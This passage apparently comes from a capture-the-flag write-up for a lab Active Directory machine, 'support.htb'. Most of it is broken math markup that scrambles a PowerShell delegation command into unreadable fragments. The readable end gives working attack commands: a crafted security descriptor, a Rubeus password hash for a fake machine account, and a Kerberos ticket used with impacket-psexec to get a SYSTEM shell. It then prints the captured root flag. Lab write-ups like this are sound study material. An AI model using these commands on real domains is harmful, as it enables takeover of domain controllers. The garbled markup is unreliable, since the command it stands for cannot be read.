style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em">ll</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">nb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">ha</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em">ll</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">nb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">ha</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span></span></span></span></span>Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0</p>
<p>.\Rubeus.exe hash /password:Summer2018! /user:attackersystem$ /domain:support.htb</p>
<p>KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass</p>
<p>Now we have an nt system shell:<br />
<img src="/_resources/18971d03c6f541a9b79e3c024a3eac3c.png" /></p>
<p>We get the root.txt<br />
1d8c922ee321c6e7843d9c43dd91821c</p>
</div>
      </article>
    </div>
  </body>
</html>
